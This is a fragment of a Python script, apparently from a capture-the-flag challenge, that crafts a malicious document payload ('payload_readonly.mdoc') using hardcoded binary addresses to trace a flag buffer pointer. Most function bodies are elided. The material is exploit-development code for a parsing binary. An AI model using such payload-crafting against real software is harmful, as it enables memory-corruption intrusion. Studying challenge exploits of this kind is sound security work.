...
READ_FILE = 0x401791
PATH_BSS = 0x406204
SIZE_OUT_BSS = 0x406220  # fixed writable .bss, avoids guessing heap
...
def document(charstrings: list[bytes], text: bytes = b"A") -> bytes:
...
def build_payload() -> bytes:
    ...
    return document([cs_read], b"A")


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate a read_file-only payload for tracing the real flag buffer pointer")
    ap.add_argument("-o", "--output", default="payload_readonly.mdoc")
    args = ap.parse_args()
    data = build_payload()
